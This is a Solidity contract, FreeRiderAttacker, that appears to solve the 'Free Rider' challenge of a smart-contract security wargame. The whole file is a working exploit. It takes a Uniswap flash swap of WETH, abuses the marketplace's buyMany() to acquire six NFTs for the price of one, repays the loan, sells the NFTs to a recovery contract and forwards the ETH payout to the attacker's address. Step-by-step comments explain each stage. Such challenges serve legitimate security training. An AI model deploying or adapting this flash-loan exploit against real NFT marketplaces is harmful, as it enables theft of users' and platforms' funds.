//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderRecovery.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    //interfaces
    IERC721 immutable NFT;
    IWETH private immutable WETH;
    IUniswapV2Pair private immutable UNISWAP_PAIR;
    FreeRiderRecovery private immutable buyer;

    //addresses
    address private immutable marketplace;
    //address private immutable buyer;
    address private immutable attacker;

    //tokens to buy
    uint[] tokenIds = [0, 1, 2, 3, 4, 5];

    //Initialize interfaces and addresses
    constructor(
        address _nft,
        address payable _weth,
        address _pair,
        address payable _marketplace,
        address _buyer,
        address _attacker
    ) {
        NFT = IERC721(_nft);
        WETH = IWETH(_weth);
        UNISWAP_PAIR = IUniswapV2Pair(_pair);
        marketplace = _marketplace;
        buyer = FreeRiderRecovery(_buyer);
        attacker = _attacker;
    }

    /**
     * A function to initiate flashswap on uniswap
     * @param _amount0 is the amount of WETH
     */
    function attack(uint256 _amount0) external {
        require(msg.sender == attacker);
        bytes memory _data = "1";

        //1. Initiate a flash swap to get wETH
        UNISWAP_PAIR.swap(
            _amount0, //amount0 => WETH needed
            0, //amount1 => DVT not needed
            address(this), //receipient of the flashswap
            _data //passed to uniswapV2Call function that uniswappair triggers on the receipent (this)
        );
    }

    /**
     * Function called by uniswapPair when making the flashSwap
     */
    function uniswapV2Call(
        address,
        uint256 _amount0,
        uint256,
        bytes calldata
    ) external {
        //check that the uniswap pair is the caller of the function and that origin is from attacker
        require(msg.sender == address(UNISWAP_PAIR) && tx.origin == attacker);

        //2. Get ETH by depositing WETH
        WETH.withdraw(_amount0);

        //3. Buy NFTs - at this point we have 15 ETH which is all we need to exploit buyMany()
        (bool nftsBought, ) = marketplace.call{value: _amount0}(
            abi.encodeWithSignature("buyMany(uint256[])", tokenIds)
        );

        //4. calculate flashswap fees and total
        uint256 _fee = (_amount0 * 3) / 997 + 1;
        uint256 _repayAmount = _fee + _amount0;

        //5. Get WETH by depositing ETH to payback the flashSwap
        WETH.deposit{value: _repayAmount}();

        //6. Not that we have WETH - payback flashwap with fee
        WETH.transfer(address(UNISWAP_PAIR), _repayAmount);

        bytes memory _data = abi.encode(attacker);

        //7. Send NFT's to buyer to get payout (45 ETH)
        for (uint256 i = 0; i < 6; i++) {
            NFT.safeTransferFrom(
                address(this),
                address(buyer),
                tokenIds[i],
                _data
            );
        }

        //8. Transfer ETH (payout) to attacker
        (bool ethSent, ) = attacker.call{value: address(this).balance}("");
        require(nftsBought && ethSent);
    }

    /**
     * Makes the contract able to recieve eth for payout and eth from buying the NFTs
     */
    receive() external payable {}

    /**
     * Function to allow this contract to receive NFTs
     * Returns selector to receive NFTs from marketplace
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
